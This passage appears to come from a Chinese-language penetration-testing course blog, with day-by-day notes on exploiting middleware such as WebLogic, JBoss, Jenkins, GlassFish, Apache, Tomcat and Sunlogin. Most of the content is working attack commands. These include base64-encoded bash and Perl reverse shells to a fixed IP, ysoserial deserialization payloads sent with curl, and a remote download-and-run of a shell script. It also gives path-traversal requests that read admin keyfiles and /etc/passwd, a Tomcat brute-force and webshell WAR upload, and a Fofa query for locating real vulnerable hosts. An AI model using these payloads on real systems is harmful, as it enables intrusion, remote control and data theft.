title="#中间件-Weblogic-工具搜哈"></a>#中间件-Weblogic-工具搜哈</h4><p>探针默认端口：7001，Weblogic是Oracle公司推出的J2EE应用服务器</p><p>cve_2017_3506   工具</p><p>cve_2018_2893   工具</p><p>cve_2018_3245   工具</p><p>cve_2020_14882  工具</p><blockquote><p>cve_2021_2394   反序列化（手工）</p><p>复现链接：</p><p>1、<a href="https://cloud.tencent.com/developer/article/1865617">CVE-2021-2394：Weblogic反序列化漏洞复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://github.com/lz2y/CVE-2021-2394">https://github.com/lz2y/CVE-2021-2394</a></p><p>2、<a href="https://www.linuxlz.com/wap/aqld/2334.html">Weblogic反序列化漏洞复现（CVE-2021-2394）-Linux实验室 (linuxlz.com)</a></p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit%EF%BC%88%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%89">https://github.com/welk1n/JNDI-Injection-Exploit（利用工具）</a></p><p>vps生成ldap 监听端口</p><p>编码：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1</p><p>执行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” -A 47.94.236.117</p><p>发送数据触发</p><p>java -jar CVE_2021_2394.jar 123.58.236.76 32185 ldap:&#x2F;&#x2F;47.94.236.117:1389&#x2F;x1nfdy</p></blockquote><h4 id="中间件-JBoos-工具脚本搜哈"><a href="#中间件-JBoos-工具脚本搜哈" class="headerlink" title="#中间件-JBoos-工具脚本搜哈"></a>#中间件-JBoos-工具脚本搜哈</h4><p>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。</p><h6 id="1、CVE-2017-12149"><a href="#1、CVE-2017-12149" class="headerlink" title="1、CVE-2017-12149"></a>1、CVE-2017-12149</h6><p>复现链接：</p><p>方法一：<a href="https://blog.csdn.net/Jerry____/article/details/103506224">(20条消息) CVE-2017-12149（JBOSS反序列化远程代码执行漏洞）漏洞复现_Jerry的博客-CSDN博客</a></p><p>方法二（下面采用的）：<a href="https://www.freebuf.com/vuls/357030.html">CVE-2017-12149 JBOSS反序列化漏洞分析 - FreeBuf网络安全行业门户</a></p><blockquote><p>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” &gt; poc.ser</p><p>curl <a href="http://47.94.236.117:8080/invoker/readonly">http://47.94.236.117:8080/invoker/readonly</a> –data-binary @poc.ser</p></blockquote><h6 id="2、CVE-2017-7504"><a href="#2、CVE-2017-7504" class="headerlink" title="2、CVE-2017-7504"></a>2、CVE-2017-7504</h6><p>复现链接：<a href="https://blog.csdn.net/weixin_42936566/article/details/86772045">(20条消息) 【Vulhub】CVE-2017-7504 JBOSS反序列化漏洞复现_看不尽的尘埃的博客-CSDN博客</a></p><blockquote><p>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” &gt; 1.ser</p><p>curl <a href="http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet">http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet</a> –data-binary @1.ser</p></blockquote><h6 id="3、弱口令-未授权访问见手册"><a href="#3、弱口令-未授权访问见手册" class="headerlink" title="3、弱口令 未授权访问见手册"></a>3、弱口令 未授权访问见手册</h6><h4 id="中间件-Jenkins-工具脚本搜哈"><a href="#中间件-Jenkins-工具脚本搜哈" class="headerlink" title="#中间件-Jenkins-工具脚本搜哈"></a>#中间件-Jenkins-工具脚本搜哈</h4><p>探针默认端口：8080，Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。</p><h6 id="1、cve-2017-1000353-JDK-1-8-0-291-其他版本失效"><a href="#1、cve-2017-1000353-JDK-1-8-0-291-其他版本失效" class="headerlink" title="1、cve_2017_1000353 JDK-1.8.0_291 其他版本失效"></a>1、cve_2017_1000353 <strong>JDK-1.8.0_291 其他版本失效</strong></h6><p>复现链接：<a href="https://blog.csdn.net/YouthBelief/article/details/121528843">(20条消息) Jenkins 远程代码执行漏洞（CVE-2017-1000353） 复现_jenkins漏洞_YouthBelief的博客-CSDN博客</a></p><p><a href="http://github.com/vulhub/CVE-2017-1000353">http://github.com/vulhub/CVE-2017-1000353</a></p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1</p><p>java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”</p><p>python exploit.py <a href="http://123.58.236.76:54217/">http://123.58.236.76:54217</a> jenkins_poc.ser</p></blockquote><h6 id="2、CVE-2018-1000861"><a href="#2、CVE-2018-1000861" class="headerlink" title="2、CVE-2018-1000861"></a>2、CVE-2018-1000861</h6><p>复现链接：<a href="https://blog.csdn.net/weixin_43486390/article/details/111495455">(20条消息) 【漏洞复现】Jenkins远程命令执行漏洞（CVE-2018-1000861）_cve-2018-1000861复现_ps_x的博客-CSDN博客</a></p><p><a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</a></p><blockquote><p>此处未知原因无法执行脚本无效，所有让其远程下载shell.txt再本地执行1.sh让其远程执行shell.txt的内容</p><p>攻击机47.94.236.117：</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1（shell.txt）</p><p>python3 -m http.server 8888</p><p>python2 exp.py <a href="http://123.58.236.76:8080/">http://123.58.236.76:8080/</a> “curl -o &#x2F;tmp&#x2F;1.sh <a href="http://47.94.236.117:8888/shell.txt">http://47.94.236.117:8888/shell.txt</a>“</p><p>python2 exp.py <a href="http://123.58.236.76:8080/">http://123.58.236.76:8080/</a> “bash &#x2F;tmp&#x2F;1.sh”</p></blockquote><h6 id="3、cve-2019-100300-需要用户帐号密码，条件苛刻"><a href="#3、cve-2019-100300-需要用户帐号密码，条件苛刻" class="headerlink" title="3、cve_2019_100300 需要用户帐号密码，条件苛刻"></a>3、cve_2019_100300 需要用户帐号密码，条件苛刻</h6><h4 id="中间件-GlassFish-工具脚本搜哈"><a href="#中间件-GlassFish-工具脚本搜哈" class="headerlink" title="#中间件-GlassFish-工具脚本搜哈"></a>#中间件-GlassFish-工具脚本搜哈</h4><p>探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器</p><h6 id="1、CVE-2017-1000028"><a href="#1、CVE-2017-1000028" class="headerlink" title="1、CVE-2017-1000028"></a>1、CVE-2017-1000028</h6><blockquote><p>读密码：&#x2F;theme&#x2F;META-INF&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-keyfile</p><p>读windows文件：&#x2F;theme &#x2F;META-INF&#x2F;prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows&#x2F;win.ini</p><p>读linux文件：&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</p></blockquote><h6 id="2、简单口令"><a href="#2、简单口令" class="headerlink" title="2、简单口令"></a>2、简单口令</h6><h4 id="配合下-Fofa-Viewer-工具脚本搜哈"><a href="#配合下-Fofa-Viewer-工具脚本搜哈" class="headerlink" title="#配合下-Fofa_Viewer-工具脚本搜哈"></a>#配合下-Fofa_Viewer-工具脚本搜哈</h4><h6 id="1、配合GlassFish读取测试"><a href="#1、配合GlassFish读取测试" class="headerlink" title="1、配合GlassFish读取测试"></a>1、配合GlassFish读取测试</h6><h6 id="2、配合Jenkins-CVE-2018-1000861"><a href="#2、配合Jenkins-CVE-2018-1000861" class="headerlink" title="2、配合Jenkins-CVE-2018-1000861"></a>2、配合Jenkins-CVE-2018-1000861</h6>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</title>
      <link href="/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/"/>
      <url>/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、中间件-IIS-短文件&amp;解析&amp;蓝屏等</p><p>2、中间件-Nginx-文件解析&amp;命令执行等</p><p>3、中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</p><p>4、中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 中间件-IIS-短文件&amp;解析&amp;蓝屏等</p><p>➢ 中间件-Nginx-文件解析&amp;命令执行等</p><p>➢ 中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</p><p>➢ 中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p><p> ➢ 中间件-Apache_RCE&amp;Fofa_Viewer-走向高端啊</p><h4 id="中间件-IIS-短文件-amp-解析-amp-蓝屏等"><a href="#中间件-IIS-短文件-amp-解析-amp-蓝屏等" class="headerlink" title="#中间件-IIS-短文件&amp;解析&amp;蓝屏等"></a>#中间件-IIS-短文件&amp;解析&amp;蓝屏等</h4><p>1、短文件：信息收集</p><p>2、文件解析：还有点用</p><p>3、HTTP.SYS：蓝屏崩溃（了解）</p><p>4、CVE-2017-7269 条件过老(了解)</p><h4 id="中间件-Nginx-文件解析-amp-命令执行等"><a href="#中间件-Nginx-文件解析-amp-命令执行等" class="headerlink" title="#中间件-Nginx-文件解析&amp;命令执行等"></a>#中间件-Nginx-文件解析&amp;命令执行等</h4><p>1、后缀解析 文件名解析</p><p>复现链接：(<a href="https://blog.csdn.net/Tauil/article/details/125888127">https://blog.csdn.net/Tauil/article/details/125888127</a>)</p><p>配置不当：该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p><p>CVE-2013-4547：影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7（复现链接：<a href="https://blog.csdn.net/weixin_45744814/article/details/120390057">(20条消息) Nginx文件名逻辑漏洞（CVE-2013-4547）复现_君莫hacker的博客-CSDN博客</a>）</p><p>2、cve_2021_23017 无EXP</p><p>3、cve_2017_7529 意义不大</p><h4 id="中间件-Apache-RCE-amp-目录遍历-amp-文件解析等"><a href="#中间件-Apache-RCE-amp-目录遍历-amp-文件解析等" class="headerlink" title="#中间件-Apache-RCE&amp;目录遍历&amp;文件解析等"></a>#中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</h4><p>Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</p><h6 id="1、cve-2021-42013-RCE"><a href="#1、cve-2021-42013-RCE" class="headerlink" title="1、cve_2021_42013  RCE"></a>1、cve_2021_42013  RCE</h6><p>POST &#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh </p><p>echo;perl -e ‘use Socket;$i&#x3D;”47.94.236.117”;$p&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312121348029.png" alt="image-20230312121348029"></p><p>发送数据包，监听到5566端口</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312121514375.png" alt="image-20230312121514375"></p><h6 id="2、cve-2021-41773-目录穿越"><a href="#2、cve-2021-41773-目录穿越" class="headerlink" title="2、cve_2021_41773 目录穿越"></a>2、cve_2021_41773 目录穿越</h6><p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><p>Burp：&#x2F;icons&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;etc&#x2F;passwd</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312121738224.png" alt="image-20230312121738224"></p><h6 id="3、cve-2017-15715-文件解析"><a href="#3、cve-2017-15715-文件解析" class="headerlink" title="3、cve-2017-15715  文件解析"></a>3、cve-2017-15715  文件解析</h6><p>Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125657894.png" alt="image-20230312125657894"></p><p>将此处的空格hex编码20换成0a</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125747888.png" alt="image-20230312125747888"></p><p>上传成功</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125812265.png" alt="image-20230312125812265"></p><p>访问1.php%0a</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125911400.png" alt="image-20230312125911400"></p><h6 id="4、cve-2017-9798-价值不高"><a href="#4、cve-2017-9798-价值不高" class="headerlink" title="4、cve_2017_9798 价值不高"></a>4、cve_2017_9798 价值不高</h6><h6 id="5、cve-2018-11759-价值不高"><a href="#5、cve-2018-11759-价值不高" class="headerlink" title="5、cve_2018_11759 价值不高"></a>5、cve_2018_11759 价值不高</h6><h6 id="6、cve-2021-37580-插件问题"><a href="#6、cve-2021-37580-插件问题" class="headerlink" title="6、cve_2021_37580 插件问题"></a>6、cve_2021_37580 插件问题</h6><h4 id="中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等"><a href="#中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等" class="headerlink" title="#中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等"></a>#中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</h4><h6 id="1、弱口令猜解"><a href="#1、弱口令猜解" class="headerlink" title="1、弱口令猜解"></a>1、弱口令猜解</h6><p><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p><p>靶场：vulfocus</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130358355.png" alt="image-20230312130358355"></p><p>抓包爆破</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130424229.png" alt="image-20230312130424229"></p><p>进入后台</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130848018.png" alt="image-20230312130848018"></p><p>发现文件上传点，上传的文件必须为war</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130931060.png" alt="image-20230312130931060"></p><p>将三个木马放进exec文件夹</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130953913.png" alt="image-20230312130953913"></p><p>将exec文件夹进行压缩为zip格式，手动将后缀zip修改为war</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131010054.png" alt="image-20230312131010054"></p><p>上传exec.war文件</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131022283.png" alt="image-20230312131022283"></p><p>上传成功</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131038744.png" alt="image-20230312131038744"></p><p>可以看到其目录上传成功，用哥斯拉连接原始的jsp文件即可</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131118349.png" alt="image-20230312131118349"></p><h6 id="2、CVE-2017-12615-文件上传"><a href="#2、CVE-2017-12615-文件上传" class="headerlink" title="2、CVE-2017-12615 文件上传"></a>2、CVE-2017-12615 文件上传</h6><p>复现链接：<a href="https://www.cnblogs.com/confidant/p/15440233.html">Tomcat任意文件写入（CVE-2017-12615）漏洞复现-含POC和EXP - 纸机 - 博客园 (cnblogs.com)</a></p><p>当存在漏洞的Tomcat运行在Windows&#x2F;Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p><p>影响版本:Apache Tomcat 7.0.0 - 7.0.79</p><p>PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</p><p>shell代码</p><h6 id="3、cve-2020-1938-文件包含"><a href="#3、cve-2020-1938-文件包含" class="headerlink" title="3、cve_2020_1938 文件包含"></a>3、cve_2020_1938 文件包含</h6><p>复现链接：<a href="https://www.cnblogs.com/twlr/p/12341569.html">CVE-2020-1938 Apache-Tomcat-Ajp漏洞复现 - 终落 - 博客园 (cnblogs.com)</a></p><p>Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p><p>漏洞影响的产品版本包括：</p><p>Tomcat 6.*</p><p>Tomcat 7.* &lt; 7.0.100</p><p>Tomcat 8.* &lt; 8.5.51</p><p>Tomcat 9.* &lt; 9.0.31</p><p>exp:<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 63667 -f WEB-INF&#x2F;web.xml</p><h6 id="4、cve-2020-11996-拒绝服务"><a href="#4、cve-2020-11996-拒绝服务" class="headerlink" title="4、cve_2020_11996 拒绝服务"></a>4、cve_2020_11996 拒绝服务</h6><p>危害过大，权限无关，意义不大</p><h6 id="5、cve-2020-9484-反序列化"><a href="#5、cve-2020-9484-反序列化" class="headerlink" title="5、cve_2020_9484 反序列化"></a>5、cve_2020_9484 反序列化</h6><p>利用条件太苛刻，意义不大</p><h4 id="中间件-Fofaviewer-amp-Apache-RCE-走向高端啊"><a href="#中间件-Fofaviewer-amp-Apache-RCE-走向高端啊" class="headerlink" title="#中间件-Fofaviewer&amp;Apache_RCE-走向高端啊"></a>#中间件-Fofaviewer&amp;Apache_RCE-走向高端啊</h4><p>server&#x3D;”Apache&#x2F;2.4.49”</p><blockquote><p>src思路：从资产信息中提取一些中间件的信息，看这些中间件是存在过漏洞，利用已知的漏洞对这些符合特征的进行检测，相当于要<strong>把目标的所有资产信息做一个分离分类</strong>，再针对性的对这些资产进行检测</p><p>如，目标是tomcat,则对其已知的漏洞进行扫描（可用python脚本），如果没有漏洞则先放弃这个点</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312134305627.png" alt="image-20230312134305627"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV</title>
      <link href="/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/"/>
      <url>/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、远程控制-第三方应用安全</p><p>2、三方应用-向日葵&amp;VNC&amp;TV</p><p>3、设备平台-Zabbix&amp;Kibana漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 远程控制-向日葵&amp;Vnc&amp;Teamviewer</p><p>➢ 设备平台-Zabbix-CVE-2022-23131</p><p>➢ 设备平台-Kibana-CVE-2019-7609</p><h4 id="远程控制-向日葵-amp-Vnc-amp-Teamviewer"><a href="#远程控制-向日葵-amp-Vnc-amp-Teamviewer" class="headerlink" title="#远程控制-向日葵&amp;Vnc&amp;Teamviewer"></a>#远程控制-向日葵&amp;Vnc&amp;Teamviewer</h4><h6 id="向日葵-RCE"><a href="#向日葵-RCE" class="headerlink" title="-向日葵 RCE"></a>-向日葵 RCE</h6><p><a href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p><p>xrkRce.exe -h 192.168.46.157 -t scan</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230311183849961.png" alt="image-20230311183849961"></p><p>xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c “ipconfig”</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230311183909511.png" alt="image-20230311183909511"></p><h6 id="Teamviewer"><a href="#Teamviewer" class="headerlink" title="-Teamviewer"></a>-Teamviewer</h6><p>复现漏洞：(<a href="https://blog.csdn.net/qq_43233085/article/details/107997220">https://blog.csdn.net/qq_43233085/article/details/107997220</a>)</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span 